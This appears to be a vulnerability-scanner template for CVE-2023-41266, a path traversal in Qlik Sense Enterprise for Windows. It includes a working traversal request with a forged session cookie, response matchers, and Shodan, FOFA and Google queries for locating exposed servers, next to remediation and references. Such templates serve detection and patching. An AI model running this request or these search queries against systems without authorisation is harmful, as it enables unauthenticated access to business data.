http:
- headers:
    Cookie: X-Qlik-Session=13333333-3333-3333-3333-333333333337
    X-Qlik-Xrfkey: '1333333333333337'
  matchers:
  - condition: and
    dsl:
    - status_code == 400
    - contains(to_lower(set_cookie), 'x-qlik-session')
    - contains(body, 'The comparison expression does not consist of three elements')
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf'
id: CVE-2023-41266
info:
  author: AdamCrosser
  classification:
    cpe: cpe:2.3:a:qlik:qlik_sense:august_2022:-:*:*:enterprise:windows:*:*
    cve-id: CVE-2023-41266
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 6.5
    cwe-id: CWE-20
    epss-percentile: 0.99938
    epss-score: 0.94295
  description: A path traversal vulnerability found in Qlik Sense Enterprise for Windows
    for versions May 2023 Patch 3 and earlier, February 2023 Patch 7 and earlier,
    November 2022 Patch 10 and earlier, and August 2022 Patch 12 and earlier allows
    an unauthenticated remote attacker to generate an anonymous session. This allows
    them to transmit HTTP requests to unauthorized endpoints. This is fixed in August
    2023 IR, May 2023 Patch 4, February 2023 Patch 8, November 2022 Patch 11, and
    August 2022 Patch 13.
  impact: 'Unauthenticated attackers can exploit path traversal to generate anonymous
    sessions and access unauthorized API endpoints, potentially extracting sensitive
    business intelligence data and manipulating Qlik Sense dashboards.

    '
  metadata:
    fofa-query:
    - app="qlik-sense"
    - title="qlik-sense"
    - icon_hash=-74348711
    - body="qlik"
    framework: windows
    google-query: intitle:"qlik-sense"
    max-request: 1
    product: qlik_sense
    shodan-query:
    - http.favicon.hash:-74348711
    - http.html:"qlik"
    - http.title:"qlik-sense"
    vendor: qlik
    verified: true
  name: Qlik Sense Enterprise - Path Traversal
  reference:
  - https://community.qlik.com/t5/Official-Support-Articles/Critical-Security-fixes-for-Qlik-Sense-Enterprise-for-Windows/ta-p/2110801
  - https://www.praetorian.com/blog/advisory-qlik-sense/
  - https://www.praetorian.com/blog/qlik-sense-technical-exploit
  - https://community.qlik.com/t5/Release-Notes/tkb-p/ReleaseNotes
  - https://github.com/Ostorlab/KEV
  remediation: 'Update Qlik Sense Enterprise to August 2023 IR, May 2023 Patch 4,
    February 2023 Patch 8, November 2022 Patch 11, or August 2022 Patch 13 that properly
    validates resource paths and enforces authentication.

    '
  severity: medium
  tags: cve2023,cve,qlik,traversal,kev,windows,vkev,vuln
